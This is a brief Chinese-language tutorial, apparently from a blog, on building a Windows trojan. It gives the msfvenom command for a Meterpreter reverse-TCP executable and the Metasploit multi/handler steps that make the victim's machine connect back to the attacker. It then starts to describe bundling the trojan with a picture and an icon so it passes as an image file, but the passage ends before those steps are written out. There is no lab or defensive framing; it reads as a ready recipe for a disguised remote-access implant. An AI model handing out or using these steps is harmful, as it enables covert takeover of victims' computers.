利用msfvenom生成木马  
配置metasploit监听端口上线  
目标主机：windows7  

  

启动kali输入命令  
msfvenom -p windows/meterpreter/reverse\_tcp LHOST=IP 端口 -f exe -o /root/name.exe

  

![](../Images/c2aeca61ff23fa6dd78ffdb840d3c8bd.png)   
  

然后msf配置过程你们懂的

  
msf > use exploit/multi/handler  
Msf exploit(handler) > set payload windows/meterpreter/reverse\_tcp  
msf exploit(handler) > show options  
msf exploit(handler) > set lhost IP  
msf exploit(handler) > set lport 4444  
msf exploit(handler) > exploit  
  
![](../Images/135719751398f2bad0308e587fdfed4c.png)   

然后我们来使用压缩工具将木马和图片捆绑在一起（网上也有现成的捆绑工具）  
  
按照下图过程进行操作  
  
需要一张图片和一个ICO图标
